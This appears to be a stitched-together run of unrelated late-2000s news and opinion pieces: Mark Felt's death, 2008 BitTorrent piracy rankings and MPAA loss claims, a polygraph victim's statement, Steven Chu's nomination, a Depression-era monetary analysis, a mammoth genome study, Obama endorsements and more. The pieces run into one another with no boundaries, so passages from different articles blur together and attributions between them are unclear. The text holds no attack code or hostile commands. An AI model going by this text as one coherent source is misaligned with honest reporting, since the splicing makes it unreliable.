In an article in the October Atlantic , Ross Douthat raises the age - old question , Is Pornography Adultery ?
He cites sex columnist Dan Savage addressing women :
Tearful discussions about your insecurities or your feminist principles will not stop a man from looking at porn .
That ’s why the best advice for straight women is .
…
If you do n’t want to be with someone who looks at porn .
. . get a woman , get a dog , or get a blind guy .
… telling women that the porn “ problem ” can be resolved through good communication , couples counseling , or a chat with your pastor is neither helpful nor realistic .
But Douthat writes :
This is n’t to say the distinction between hiring a prostitute and shelling out for online porn does n’t matter . …
But if you approach infidelity as a continuum of betrayal rather than an either / or proposition , then the Internet era has ratcheted the experience of pornography much closer to adultery than I suspect most porn users would like to admit .
[ Emphasis added . ]
Read Douthat ’s insightful article for why he believes that .
Meanwhile , the argument can be dragged out ad infinitum .
It ’s possible to buy Savage ’s viewpoint , but still be troubled by how much time and money are spent respectively with and for porn .
While one ’s reflex is to claim that it ’s up to the individual to decide , that ’s kind of a cop-out .
Our readers are asked to help decide with their comments whether a line should be drawn and at what point .
Specifically . . .
1 . Do you agree with my distinction ( that the more time and money porn incurs , the closer the viewer hews to infidelity ) ?
2 . How much is too much : a. time spent b. money spent — viewing Internet porn ?
( CNN ) -- W. Mark Felt , who leaked information to reporters under the moniker , " Deep Throat , " about the Watergate break - in , died Thursday at the age of 95 , sources told CNN .
W. Mark Felt , known as " Deep Throat , " divulged information to reporters about the Watergate break - in .
Rob Jones ,
Felt 's grandson , said his grandfather died at his home in Santa Rosa , California .
According to published reports ,
Felt died of congestive heart failure .
Felt admitted in a 2005 Vanity Fair article he was the Washington Post 's source for many of its 400 stories on the Watergate affair during the early 1970s .
The Watergate break - in eventually led to the 1974 resignation of President Richard Nixon .
" I 'm proud of everything that Deep Throat did , " Felt , 92 , told CNN's " Larry King Live " in 2006 , his first public interview on the subject .
Felt 's entanglement with history occurred in 1972 after the bungled break - in at the Democratic National Party offices in the Watergate hotel .
Felt , an associate director at the FBI , said he was unhappy with the way the administration meddled with the investigation into the break - in , which led him to divulge information to the newspaper .
Watch how Felt played a pivotal role in presidential history »
Carl Bernstein and Bob Woodward , then - rookie reporters with the Washington Post , did stories about the break - in and subsequent cover - up .
Both men credited
Felt for helping them , but Bernstein said Felt was a tough interview .
" He did n't leak .
He had to really be squeezed , " Bernstein said in a 2006 interview .
" He confirmed mostly what we had gotten elsewhere .
He did n't want to volunteer a lot of information , yet his role was essential in giving us a solidity and a knowledge that what we were reporting was right . "
Watch Bernstein praise
Felt 's courage »
Do n't Miss Bernstein never met
Felt until this year
When King asked Felt whether he felt he had done anything wrong in going outside approved channels to get information out , Felt was unequivocal .
" I thought I was doing the right thing , " he said .
Watch Felt 's interview with Larry King »
Felt , who retired from the FBI in 1973 , had his own legal problems .
He was convicted in 1980 on conspiracy charges for authorizing government agents to break into homes without search warrants in a hunt for bombing suspects in 1972 and 1973 .
When the case went to trial , former President Nixon testified on Felt 's behalf .
Felt was eventually pardoned in 1981 by President Ronald Reagan .
When asked how he would like to be remembered , Felt said , " I 'd like to be remembered as a government employee who did his best to help everybody . "

All About W. Mark Felt • Watergate Hotel
As 2008 moves toward its end , we have been taking a a look at the most pirated titles in various categories .
Following our Top 10 games post where ' Spore ' headlined , we now take a look at movies .
Unsurprisingly , The Dark Knight comes out on top , with the rest of the chart featuring a few surprising entries , and some unexpected absentees .
Mirroring its success at the box office , The Dark Knight is leading this list of 2008 ’s most pirated movies on BitTorrent .
Written and directed by Christopher Nolan , the sequel to ‘ Batman Begins ’ holds the record for the best opening week and weekend in movie history , and has grossed close to a billion dollars worldwide .
The film ’s success does n’t stop at the box office either .
Earlier this week the DVD was released , and on the first day in stores 3 million copies were sold in the United States , Canada and the UK .
Alongside these impressive real - world sales , the film beat the competition on BitTorrent and other filesharing networks too .
With more than 7 million downloads on BitTorrent alone , The Dark Knight now holds the title of most pirated movie of 2008 .
Comments on various BitTorrent sites reveal that many downloaders obtained an illegal copy after they had already watched the movie in the movie theater .
As with every other blockbuster , ‘ The Dark Knight ’ was leaked onto the Internet in various formats .
It began right after the premiere in July with a cammed version , which was celebrated by the folks from The Pirate Bay .
The ‘ cam ’ was followed by a DVD - screener in early September , and a DVD in November .
The latter release turned out to be the most popular among filesharers .
As we look over the rest of the top 10 , we see that there are quite a few differences between popularity at the box office , and on filesharing networks .
‘ Indiana Jones and the Kingdom of the Crystal Skull ’ , for example , came in second at the box office , but only came in 30th place in the download chart .
On the contrary , ‘ The Bank Job ’ is the third most pirated movie on BitTorrent , but just 66th at the box office .
The data for this list is collected by TorrentFreak from several sources , including reports from all the large BitTorrent trackers .
All formats , including cammed versions are counted , and based on previous experience a correction is made for smaller . torrent releases that we might have missed .
Personal Statement of Jordan Gonzales
19 February 2013
My name is Jordan Gonzales .
I am a 20 year old from Houston , Texas , and have been polygraphed three times .
I have failed every single one , though I was 100 % truthful .
It first started when I applied to the Harris County Sheriff 's Office , wanting to go in as a jailer .
I met every requirement for the job and thought for sure after passing the pre-employment tests I had this job in the bag , until the polygraph happened .
During the whole process I was confident in my answers , with no problem .
A little bit nervous as normal , but I was also diagnosed with clinical anxiety as a young boy .
Which makes me feel panic and nervousness even when nothing is going wrong .
Even though I am medicated , it still does not suppress it 100 % .
I took the polygraph test .
Waiting for the tester to come in , he explained to me I had some " deception . "
As I explained to him I answered with complete honesty , he seemed not to believe me .
Which really hurt my feelings to know I was telling the truth , yet he was calling me a liar .
I quickly realized that what I thought was just a interview process was turning into an interrogation .
He explained to me that because of this , I could never apply at the Harris County Sheriff 's Office again , which deeply upset me .
I have wanted to be a police officer my whole life , especially for Harris County .
I took this as just a small road bump and later got a call from the Dallas Police Department .
Same opportunity , same position .
I took the trip to Dallas thinking this one is it .
I have nothing to hide , I know what to expect now , and this is where fate has sent me .
Same process .
I was asked a few questions .
The polygrapher checked out my answers and proceeded to the next test , the polygraph itself .
This time , once being hooked up , I was very nervous .
Having failed one already put a little more weight on my shoulders .
As the results came back , the polygrapher said I showed deception on a few of the questions .
I said this had happened in Houston , too , and I do n't know what has happened .
I failed it too .
They would not let me proceed onto the next phase of testing , and I was sent on my way home .
Telling my friends and family about this , all where surprised that I could n't get the jobs , knowing I have n't done anything to disqualify myself .
Especially since everyone knew I wanted to be a police officer more than anything .
While in the process of applying for these jobs , people where already calling me " Officer Gonzales , " having much faith in my ability to be a police officer and knowing what it meant to me , which it still does .
A few months later , my mother 's wedding ring went missing .
At the time the only people at the house were me and two men from Direct TV .
I was taking a shower , getting ready for the day , while these guys where going all around the house doing work on all the rooms that had cable .
When my mother got home , she asked where her ring was .
I did not know .
All her other jewelry was there except this ring .
My mother made a police report .
I gave my statement and the officer said the investigator will talk to some people and see what he can do .
After a few days , both Direct TV guys explained that only one of them was in the house .
And neither said they took the ring .
It was their word versus mine .
The investigator said that the only way the investigation would go anywhere was a polygraph .
Since it was their word vs. mine , the investigator said the only way to get them to the polygraph was for me to take one also .
Which I knew meant I had to go first before they did .
I got tested again , this time trembling .
Failing two already , knowing I told the truth , was unbearable .
After doing the first round of the test I was so nervous and sick to my stomach the polygrapher told me on the next tests , she only wanted me to nod my head up and down for yes , and side to side for no .
And if I needed to throw up to go on ahead .
My anxiety kicked into full gear , and I had a full blown panic attack .
A feeling I know all too familiar .
She left the room for a few moments , and before she came back into the room , I already knew what was coming : disappointment .
She came in and explained that I showed signs of " deception . "
She also said that she did n't even need the polygraph , she could tell just by my reactions in the chair .
I explained to her that I have clinical anxiety and that was the reason I was getting nauseous and could n't stay still or could barely talk .
She said she has had people with worse symptoms of anxiety , even murderers who came into the chair and stayed calmer than I did .
I realized again this was n't an examination , but an interrogation .
I pled to her I come from a family of means .
Usually , if I ask my parents for something , they will give it to me ; if not , I have a part time job , so I just work and get whatever it is myself .
But most importantly , I know how much that ring means to my mother , so I would never steal it or anything from her .
I told the " polygrapher " that I would n't have any benefits for taking it .
She said I failed every question , and I knew where it was , who it was given to , and what I did with it , and why .
I left there , told my mom everything , and she knew I did n't take it .
If anyone knows you 're lying , it 's going to be your mother .
Everyone 's lied to their mother , and they know when it 's a lie .
At least my mother does ( haha ) .
The investigator soon called my mother and said the case has been dismissed because no evidence has been provided .
When asked if the Direct TV employees where polygraphed , they " could not say . "
A few months later , while cleaning her room , my mother found her wedding ring that was simply misplaced .
Not stolen by her son like the " polygrapher " had said .
I was very happy for my mother , and she knew I was n't lying to her or anyone else .
The only thing I felt for was knowing that the occupation I have been pursuing since I was a young boy , my hopes and dreams , classes and criminal studies , were all wasted .
All because of a simple polygraph test that said I was lying .
When all along I told the truth in all three instances .
Many people did not believe I told the truth on the first two tests , but once my mother found her wedding ring in her room that was misplaced , EVERYONE believed me .
Now I am very dedicated to stopping the misuse of polygraphs .
The lie detector is a lie .
This is my story and I hope it inspires someone to notice it .
And take a stand for what really is right .
Most scientists consider the last eight years a tough era in Washington .
But President - elect Barack Obama 's reported picks for Secretary of Energy and EPA
administrator and the creation of an " energy czar " signal a return to scientific principles in the decision - making process at the federal level .
And it 's about time .
One of the biggest reasons to fill the scientific vacuum in Washington is the pressing need to find new sources of sustainable energy .
For this to become reality , Washington needs to step up and support science when industry and academia are unwilling or unable .
Lisa Jackson , EPA head
" The federal government has an opportunity to do something , " said physicist Steven Chu , Obama 's Nobel Prize - winning choice to head the Department of Energy .
" To give more money to a few universities and a couple of national labs , to a core of people who can get this done . "
" If the backers are willing to back you , you go for the home run .
Bell
Labs would go for the home run , " he said .
" The United States should put down research bets to go for the home run . "
Last September , Chu talked to me about the future of U.S. science as industry , universities and even national laboratories seemed to be moving away from long - term , large - scale science research .
His comment came after Bell Laboratories announced it was shutting down its fundamental physics research lab , which had fostered six physics Nobel Prizes including Chu's .
The way to solve the energy problem , Chu said , is to take it on the way Bell Labs scientists tackled the problem of replacing the inefficient vacuum tubes it used to connect phone lines from one side of the country to the other , with the long - term support of a forward - thinking company .
But this time , the government has to make the investment .
I met Chu four years ago when he became director of the DOE 's Lawrence Berkeley National Laboratory , which I covered as a science reporter at a Bay Area newspaper .
Since then , he has consistently thought big , followed through and exceeded expectations .
I think he has what it takes to keep doing so .
He recognizes the need to invest in science , from grade schools to universities to industry .
He sees the imperative for the government to think in new and big ways about the energy problem .
He understands we have to face up to climate change .
And , most importantly , he has ideas about how to get it all done and the character to make them happen .
If the word on the street is true , for first time since the post of Secretary of Energy was established in 1977 , it will be filled by a Nobel laureate and an Asian American .
While these firsts are impressive , what really sets him apart is the rare combination of a brilliant scientific mind coupled with a natural way with people .
The fact that Obama made such a spot - on choice for Secretary of Energy gives me the kind of hope I have n't had in , well , at least eight years — because I think Chu has the right ideas .
And I think he could be the man to make them happen .
Politicians and other people who have never met
Chu are predictably questioning whether a career scientist can successfully navigate
Washington , stand up to Big Oil and push major energy reform through the legislature next year .
As a scientist and a science journalist , I may be biased in this regard , but it strikes me as highly appropriate that the federal agency that funds more scientific research than any other should be run by a scientist rather than a politician .
While current Secretary of Energy Samuel Bodman taught chemical engineering at MIT , he moved into business and politics on his way to the DOE , and most of his predecessors were lawyers and politicians .
Chu has worked as a research physicist since 1976 at UC Berkeley , Bell Labs and Stanford University .
And Chu is n't just a career scientist :
He 's one of the most respected physicists in the world .
Carol Browner , energy czar
Quick bio :
The longest - serving EPA administrator in the history of the agency , Browner is the non-scientist on the team .
She came up through politics , working as Al Gore 's legislative director in the late 1980s , before heading the Florida Department of Environmental Regulation .
She was appointed by Bill Clinton in 1993 to helm the EPA and left in 2001 .
Since then , she 's been a consultant with The Albright Group .

Reaction , mixed : Grist : " He could n't have picked a better person than Carol Browner , " said Anna Aurilio director of the D.C. office of Environment America .
" Most unfortunate decision , " said Myron Ebell , director of energy and global warming policy for the Competitive Enterprise Institute .
At Bell Labs , he devised a way to cool , trap and manipulate individual atoms using lasers .
Trapping atoms was n't a new idea , but Chu figured out how to actually do it .
That breakthrough opened up new realms in physics and led to important advances in molecular biology , a more accurate atomic clock and more precise measurements of gravity , which have improved exploration for oil , gas and minerals .
And won him the Nobel Prize in 1997 .
Physicists , though I love them , can be among the most difficult scientists to to carry on a conversation with .
Not Chu .
He is n't merely well - spoken for a scientist , he is well - spoken , period .
He was able to tune his explanation of his Nobel Prize - winning research precisely to my level of understanding .
And I 'm not alone —
I 've witnessed him successfully explain high - energy particle physics to Arnold Schwarzenegger as well .
He 's as comfortable talking about how to solve the world 's energy problems as he is describing a childhood filled with Erector sets and homemade rockets .
He'd be a great guy to hang out with over a couple of beers .
And while this may not seem to be an important qualification for a cabinet secretary , I think it is .
Chu has the ability to win people over , and this will be critical if he is going to make the kind of impact on the country 's energy policy that I think he can .
At Berkeley Lab , he turned his considerable strength and determination as a scientist and as a leader toward ambitious energy projects in an effort to make the lab the world leader in renewable energy research .
He convinced BP to spend $ 500 million over 10 years on a solar energy project at the lab that is researching ways to store solar energy as transportation fuel .
He brought several national labs , universities and industry together to work on bioenergy at the Joint BioEnergy Institute and the Energy Biosciences Institute .
He encouraged the scientists in his charge to work on energy research .
Many were inspired to take up the challenge , some even changing the entire direction of their scientific careers .
" People who were doing energy research with their left hand are now doing it with both hands , " he said .
These are leadership skills that will serve him well as Energy Secretary .
And the country really , really needs some leadership in the energy arena .
Americans take for granted that the United States leads the world in science , Chu said .
" But we 've lost many of these leads , especially when it comes to energy . "
" The U.S. is making it easier for other countries to catch up and pass us , " he said .
Other countries are making the right investments over the long term , more along the lines of the Bell Labs model .
The Europeans had long term tax - credits , and now we use their wind - turbine technology .
The United States needs a business environment that allows businesses to make investments in science , he said .
U.S. companies should be able to write off scientific research as a tax credit .
" We have an option to be a leader in energy technologies , but we are not because our support system for that is on again off again .
The future wealth of the United States will come from our ability to invent new technologies . "

Following the banks and the car companies , the movie industry might be the next to be hit by the economic downturn .
No bail - out plan has been suggested as of yet , but MPAA chairman Dan Glickman is worried that piracy will grow to a new high during the current financial crisis - and he might just have a point there .
If everything the MPAA said was true actually turned out to be true , the movie industry would have been bankrupt years ago .
In 2005 the organization funded a study which claimed that in the US alone , over $ 6 billion was lost to MPAA members due to piracy .
However , the figures and data behind those claims have never been publicly released , and it later became apparent that they were not completely accurate .
In fact , earlier this year the MPAA had to release a statement saying ‘ they made a mistake ’ in the figures .
Nevertheless , the $ 6 billion figure in question has been quoted a lot , with MPAA chairman Dan Glickman still using it in almost every public talk , to convince his listeners of the seriousness of the ‘ piracy ’ issue .
According to the MPAA there is more bad weather ahead , as it is now worried that piracy might flourish in the current financial climate .
“ If you look at the situation , the current economic crisis makes this problem much more serious than before , ” Glickman said recently at a forum , adding , “ If we do n’t protect IPR ( intellectual property rights ) , our economic losses will be far worse . ”
The MPAA will of course leave no excuse unused to justify its anti-piracy measures , nothing new there .
Although there are no studies that show how illegal downloads actually affect sales at the box office , there has been a significant bump in the number of BitTorrent users recently .
One should always be cautious to interpret these two events as having a causal relationship .
However , after several months of relatively slow growth , BitTorrent sites have seen a dramatic increase in visitor numbers this fall .
Since September , the number of peers tracked by The Pirate Bay has nearly doubled from 14 million in early September , to 25 million now .
Other BitTorrent sites such as Mininova , Torrentz and BTjunkie report an increase in downloads , searches and web traffic , ranging from 25 to 50 percent over the same time frame .
This increase , even if it is directly related to the economic downturn , is not necessarily linked with a drop in box office grosses or DVD sales .
‘ The Dark Knight ’ , which is the most downloaded movie on BitTorrent in 2008 sold millions of DVDs , and grossed a record breaking billion dollars in cinemas worldwide .
That does not really sound like a ‘ bad year ’ to us .
Pamela Latrimore , 42 , has cancer , arthritis , and no insurance .
So the Fort Pierce , Florida woman is hoping to make some cash auctioning off an MRI of her brain that contains an image of the Virgin Mary .
From TCPalm :
In 2002 , Latrimore had an MRI of her brain done and the results were stashed in her thick pile of medical records .
Her sister - in - law looked at the sheet recently and pointed out what appeared to be the image of the Virgin Mary .
Having seen where other supposed images of Mary or other religious icons were sold for thousands of dollars , Latrimore plans to post the MRI scan on eBay , the online auction site .
She hopes to earn enough money to pay off some of the medical bills she and her contractor husband cannot afford .

Still , as they milled around the factory ’s entrance this weekend , some workers said they doubted that the company was really in financial straits , and they suggested that it would reopen elsewhere with cheaper costs and lower pay .
Others said managers had kept their struggles secret , at one point before Thanksgiving removing heavy equipment in the middle of the night but claiming , when asked about it , that all was well .

Workers also pointedly blamed Bank of America , a lender to Republic Windows , saying the bank had prevented the company from paying them what they were owed , particularly for vacation time accrued .
“ Here the banks like Bank of America get a bailout , but workers cannot be paid ? ” said Leah Fried , an organizer with the union workers .
“ The taxpayers would like to see that bailout go toward saving jobs , not saving C.E.O.’s. ”
In a statement issued Saturday , Bank of America officials said they could not comment on an individual client ’s situation because of confidentiality obligations .
Still , a spokeswoman also said , “ Neither Bank of America nor any other third party lender to the company has the right to control whether the company complies with applicable laws or honors its commitments to its employees . ”
Inside the factory , the “ occupation ” was relatively quiet .
The Chicago police said that they were monitoring the situation but that they had had no reports of a criminal matter to investigate .
About 30 workers sat in folding chairs on the factory floor .
( Reporters and supporters were not allowed to enter , but the workers could be observed through an open door . )
They came in shifts around the clock .
They tidied things .
They shoveled snow .
They met with visiting leaders , including Representatives Luis V. Gutierrez and Jan Schakowsky , both Democrats from Illinois , and the Rev. Jesse Jackson .

I 've taken Mike Shedlock a/k / a Mish to task on a couple of items lately .
But one of his graphs tells a very interesting and timely story that is worth a little more in - depth discussion .
Most people who have read about the Great Depression understand that part of what happened is that the money supply ( M1 and M2 ) contracted sharply and that there is a school of thought that this was a prime driver of the Depression .
But then there 's the anomaly shown in this graph :
As I will discuss below , the two spikes in the monetary base - in December 1930 and October 2008 - have a lot in common .
As can plainly be seen , about midway through the Depression the monetary base expanded dramatically .
Here is a closer look :
So , what happened in December 1930 to cause the explosion in the monetary base and why did n't it end the Drepression ?
Therein lies a story of importance for our current Crisis .
As I described in my diary , 1930 , the Great Depression really started as an " autonomous consumer decline " before there was a substantial contraction of money supply , or trade wars , or bank runs .
Those all started in 1930 , the bank runs outside of a couple of farm areas only in the last two months of 1930 .
This run on the banks at the end of the year , as it turns out , is crucial to explaining the expansion of the monetary base .
There was a bristling exchange between Prof.
Paul Krugman and Prof. Anna Schwartz on this very issue last year .
Here 's Krugman :
In interpreting the origins of the Depression , the distinction between the monetary base ( currency plus bank reserves ) , which the Fed controls directly , and the money supply ( currency plus bank deposits ) is crucial .
The monetary base went up during the early years of the Great Depression ...
But the money supply fell sharply ...
This divergence mainly reflected the fallout from the wave of bank failures in 1930 – 1931 : as the public lost faith in banks , people began holding their wealth in cash rather than bank deposits , and those banks that survived began keeping large quantities of cash on hand rather than lending it out , to avert the danger of a bank run .
The result was much less lending , and hence much less spending , than there would have been if the public had continued to deposit cash into banks , and banks had continued to lend deposits out to businesses .
....
Friedman and Schwartz did n't say that .
What they said instead was that the Fed could have prevented the fall in the money supply , in particular by riding to the rescue of the failing banks during the crisis of 1930 – 1931 .
If the Fed had rushed to lend money to banks in trouble , the wave of bank failures might have been prevented , which in turn might have avoided both the public 's decision to hold cash rather than bank deposits , and the preference of the surviving banks for stashing deposits in their vaults rather than lending the funds out .
And this , in turn , might have staved off the worst of the Depression .
And here is Schwartz 's reply :
Krugman claims that Friedman engaged in crude assertion by stating that the Federal Reserve " permitted a sharp reduction in the monetary base . "
In fact , the monetary base declined over 5 percent from April 1928 to October 1930 , certainly a sharp reduction ; details are in pages 290 , 340 –342 , and 803 of the Monetary History ...
The 1930 –1933 increase in the monetary base did not reflect official ease , as Krugman implies , but the general public 's flight into currency in response to their distrust of banks .
Only the currency component of the base rose ; the bank reserves component declined ( pp. 739–740 ) .
....
[ In ] 1973 Friedman [ said ] :
Just as banks all around the country were closing , the Fed raised the discount rate ; that 's the rate they charge for loans to banks .
Bank failures consequently increased spectacularly .
We might have had an economic downturn in the thirties anyway , but in the absence of the Federal Reserve System — with its enormous power to make a bad situation worse — it would n't have been anything like the scale we experienced .
Friedman clearly characterized the problem as Federal Reserve failure to support commercial banks .
In other words , in response to the first bank run at the end of 1930 , the public started to hoard cash .
Therefore Federal Reserve had to constantly replenish the actual cash in circulation , thereby increasing the monetary base dramatically .
Mish is making the argument that essentially the same thing is happening now : banks are hoarding cash and refusing to lend .
While I disagree with the " refusing to lend " part , the rest of the analysis has great merit .
Certainly we have n't had a traditional " run on the banks " in 2008 , but I believe we have had the 21st century equivalent : a run on hedge funds .
In October alone , according to some stories , $ 100 billion was taken out of hedge funds !
Readers may recall that several money market funds " broke a buck " and closed in September , and investors began to panic about those as well , until their funds were guaranteed by a " MMDIC " insurance fund set up by the Federal government .
It is most likely this panic that was relayed to Congress by Bernanke in asking for the immediate injection of $ 700 billion into the banking system at that time .
Mindful of Friedman 's analysis of the Great Depression , Bernanke was not about to let the " banks " fail as in December 1930 .
Fed funds was allowed , effectively , to fall to 0 % , and banks were reliquified -- or made solvent , depending on your point of view -- with a massive increase in the monetary base .
In both cases , the surge in the monetary base was a direct reaction to a " run on the banks " during a solvency crisis of the financial system .
From the end of 1930 to mid-1933 the public hoarded cash , and the Great Depression wound on .
If Mish is correct , a similar thing is happening now .
If , on the other hand , banks are gradually increasing their lending , and M1 and M2 continue to increase as they have for the last 4 - 6 months , there may yet be a respite by summer of next year .
For thou shalt worship no other god : for the Lord , whose name is Jealous , is a jealous god .
— Exodus 34:14
Many verses in the Bible , such as the one above , state unequivocally that Yahweh is a jealous and vengeful lawgiver .
They warn of how he loathes idols , and graphically describe the dreadful punishments he will inflict on any of his chosen people who go astray and worship false gods .
In fact , the prohibition on worshipping false gods is the very first of the Ten Commandments – more important than abstaining from theft or murder , more important than honoring your parents or being faithful to your spouse .
I ’ve often wondered how Jews , Christians and Muslims justify the overriding , supreme importance placed on this rule in their respective religious traditions .
Sure , if God existed , I could see him mentioning it here or there – but why stress it this much ?
Why exalt it above all other moral duties , including those about being kind and loving your fellow people ?
Are we to believe that the infinite , all - powerful ruler of all existence , the creator of an awe - inspiring universe of a hundred billion galaxies with a hundred billion stars each , feels slighted , or worse , threatened if the inhabitants of one insignificant planet do n’t give him what he views as his due praise ?
Such a depiction speaks to me not of omnipotence and infinite wisdom , but of puny ego and petty jealousy .
These are the faults of a vain and insecure human , not the character traits of anything we might reasonably call a god .
No , I think there must be a better reason why the Bible depicts God as all - consumingly jealous .
And I think I know what that reason is .
To know more about a god , look to its creators .
Why are human beings jealous ?
The answer , as in many things , lies in evolution .
If our male ancestors were unconcerned with their mate ’s fidelity , they might well end up using their time and energy to raise other men ’s children , rather than propagating their own genes .
That variant would soon die out of the gene pool .
By contrast , the ancestors who jealously guarded their paternity are the ones whose genes were passed on to us .
A similar principle holds for our female ancestors : those who demanded that their mate spend his effort on caring and providing for their own children , rather than the children of another woman , would be far more likely to pass on their genes than those who were indifferent .
In both cases , in the brute calculus of reproductive success , jealousy wins and free love loses out .
Richard Dawkins is famous for pointing out that memes , the units of cultural transmission , undergo selection and evolve very much like genes .
And we can apply that lesson in this case to come to a surprisingly powerful conclusion : human beings and gods are jealous for the same evolutionary reasons .
After all , what would happen to a religion which taught that its followers could freely mix and mingle with the teachings of other faiths ?
Like the free - loving ancestor , its memes would soon be mutated and diluted into unrecognizable form .
It might survive in some form , but nothing like a coherent set of beliefs or teachings could be passed down over time .
But a jealous god , like a jealous human being , has far better odds of perpetuating itself with fidelity .
Stern warnings against worshipping other gods or following other teachings keep the line of transmission pure and ensure that the belief is replicated faithfully from one generation to the next .
It may well be that inherently syncretistic belief systems , including modern - day religions like Wicca , simply can never gain much power because they are too diverse .
The only kind of religion that can act with ideological unity are the religions of the vindictive and jealous gods – and it ’s ironic that those believers who fiercely police the purity of their doctrines , supposing themselves to be doing God ’s will , are really just victims of a trick of memetic evolution .
( CNN ) --
A team of scientists at Penn State University could be one step closer to bringing extinct species back to life .
This drawing shows a prehistoric woolly mammoth linked to a strand of DNA and emerging from a block of ice .
Using next - generation instruments and groundbreaking DNA - reading techniques , scientists have uncovered much of the genetic code of the woolly mammoth , a prehistoric species of elephant .
The achievement could help scientists study why some species go extinct but others do not , and may even be useful in protecting other animals from extinction .
It also raises the possibility that scientists could use genome - wide sequencing to re-create an extinct creature .
" This really is the first time that we have been able to study an extinct animal in the same detail as the ones living in our own time , " said Stephan Schuster , a Penn State University biochemistry professor and co-author of the research .
Project scientists have detailed more than 3 billion DNA building blocks of the mammoth , according to a study published in Thursday 's journal Nature .
This is still enough data to give scientists new understanding into the timing of evolution and the contributing factors that trigger extinction of a species .
" The team is searching the mammoth 's genome for clues about its extinction , " said study co-author and biologist Webb Miller .
The million - dollar project is about 80 percent finished .
Do n't Miss Penn State 's Mammoth Genome Project
Penn State 's Mammoth Genome Project Scientists discover unknown penguin species
The project relied on hairs found on two frozen mammoth mummies that were buried in the Siberian permafrost for 20,000 and 60,000 years .
With mammoth hairs , scientists were able to avoid the bacterial and viral contamination they had encountered using bone tissue .
The hair shaft encases the DNA like a biological plastic , making the genetic information less prone to environmental damage .
Finding and isolating the DNA was one thing , but sequencing the genome had its own challenges , scientists said .
" It 's like a mirror that you smash on the floor .
Then , like a jigsaw puzzle , you try to piece the DNA back together , " Schuster said .
After scientists pieced together the broken pieces of the ancient genome , their analysis began .
The genetic map of the modern African elephant was used as a blueprint to compare and contrast the genetic markers of the woolly mammoth .
The genetic data indicated that there were two distinct groups of woolly mammoths which separated about 2 million years ago .
One of these sub-populations went extinct approximately 45,000 years ago , but the other lived until after the last ice age , about 10,000 years ago .
These two groups of mammoths were living in the same environment but were not interbreeding , causing low genetic diversity in their population .
Miller and Schuster noticed that most of the mammoths they examined had far less genetic diversity than other species that are still alive , which may give clues into the biology of extinction .
Then there 's the intriguing possibility of resurrecting a mammoth .
" By deciphering this genome , we could , in theory , generate data that one day may help other researchers to bring the woolly mammoth back to life by inserting the uniquely mammoth DNA sequences into the genome of the modern - day elephant , " Schuster said .
" It could be done , " he added .
" The question is , just because we might be able to do it one day , should we do it ? "
The team plans to finish sequencing the woolly mammoth 's genome after the project receives additional funding .

The field of institutions and public figures endorsing Barack Obama is getting really crowded , and it ’s a motley assortment .
Some fairly unlikely personalities are in the tank , including Christopher Buckley , Christopher Hitchens and Colin Powell , as well as conservative publications like the Record .
Spend a few minutes perusing the Wikipedia page listing Obama ’s endorsements , and you might visualize a rowdy cocktail party whose guest list includes editors from nearly every major U.S. newspaper ( including the Chicago Tribune , marking its first endorsement of a Democratic presidential candidate in its 161 - year history ) ; hundreds of current and former governors , mayors , and legislators ; CEOs , actors , rock stars , and authors ; and even the plumbers ’ union ( presumably Joe the Plumber was not consulted since , well , he ’s not a plumber ) .
The New Yorker provided a characteristically thorough endorsement of Obama .
The New York Times argues for the relevance of newspaper endorsements .
And there ’s a nifty map illustrating the distribution of this year ’s newspaper endorsements and comparing it with 2004’s .
Several cast members of HBO's The Wire are stumping for Obama .
( Gbenga Akinnagbe , if he ’s half as terrifying as the drug lieutenant he played on the series , will make a very compelling canvasser ) .
An absolutely fabulous coterie of fashion designers has pledged allegiance .
And ostensibly apolitical publications have weighed in , most recently the science magazine Seed .
Leading the ironic - endorsement pack is onetime McCain campaign advisor Charles Fried , whose decision to back Obama is partially due to McCain ’s “ choice of Sarah Palin at a time of deep national crisis ” ( via Talking Points Memo ) .

All of which begs the question :
Who ’s in poor old John McCain ’s corner ?
The list of newspapers endorsing him is considerably shorter than Obama’s .
There ’s Steve Forbes , of course .
And then there ’s the small faction of Hollywood conservatives ( say it ai n’t so , Gary Sinise ! ) .
What happened
U.S. personal spending fell 0.3 percent in September , a bigger drop than expected and a bookend to the weakest quarter in three decades .
The numbers suggest that the economy will slump further in coming months .
“ Consumers have thrown in the towel , ” said Nariman Behravesh , chief economist at IHS Global Insight .
( Bloomberg )
What the commentators said
So “ the long - feared capitulation of American consumers has arrived , ” said Paul Krugman in The New York Times .
Since “ American consumers almost never cut spending , ” this is a big deal .
And the timing of their “ new sobriety is deeply unfortunate . ”
Sure , Americans have been living beyond their means , but saving now could hurt everybody .
A lot of the drop in consumer spending is tied to the slide in home values , said the Los Angeles Times in an editorial .
And although it is n’t a popular idea , “ to put it mildly , ” we probably need to bail out struggling homeowners .
Like the other recent bailouts , it ’s a case of having to intervene “ when the market ca n’t help itself . ”
Call it “ a bailout in every pot . ”
Well , there is some good news for consumers , said Myra Saefong in MarketWatch .
Gas prices “ have dropped every day for the past six weeks , ” and that could have wider effects on the economy .
People are more likely to travel , gas stations are more likely to stay in business , and “ consumers are just a little bit happier . ”
It wo n’t save us , but it could help .

What ’s your child ’s “ genetic destiny ? ”
Does diabetes run in your family ?
Or has a genetic test indicated that your child may some day be at risk for developing heart disease ?
In the current era of direct - to - consumer genetic testing , many fear that individuals will put too much faith in a genetic test result .
But a new study from the University of Michigan C.S. Mott Children ’s Hospital indicates that information from family history and genetic testing caused equal concern among parents about their children ’s risk of disease .
“ We were surprised to find that parents were not overly concerned about a child ’s genetic test result compared to a child ’s genetic risk that comes from family history ” says study lead author Beth A. Tarini , M.D. , an assistant professor of pediatrics and a member of the Child Health Evaluation and Research ( CHEAR ) Unit in the Division of General Pediatrics at Mott .
“ Our findings suggest that even as genetic tests become more accessible , family history will likely remain a meaningful part of a child ’s health evaluation and our discussions with parents . ”
In contrast , when asked about themselves , parents were more likely to be worried when family history – not genetic testing – indicated that there may be a chance for developing a disease .
“ Parents interpreted risk differently for themselves than for their children .
For parents , family history – in effect , one ’s observed genetic destiny – trumped disease risk as measured by genetic tests , ” notes Tarini .
The study – set to appear in the November issue of Archives of Pediatric & Adolescent Medicine – asked parents to separately assess their level of concern for their own as well as their children ’s genetic disease risk based on family history and genetic testing .
Direct - to - consumer genetic testing is making it easier than ever for families to get genetic test results and studies have shown that individuals ’ perceptions of genetic disease risk have been shown to influence their health care decisions .
Therefore , Tarini and her colleagues felt it was important to learn more about whether parents are more concerned about their child ’s genetic risk when it comes from a genetic test result .
In all , the source of the risk information – family history or genetic test results – did not affect parents ’ concern about their children ’s disease risk .
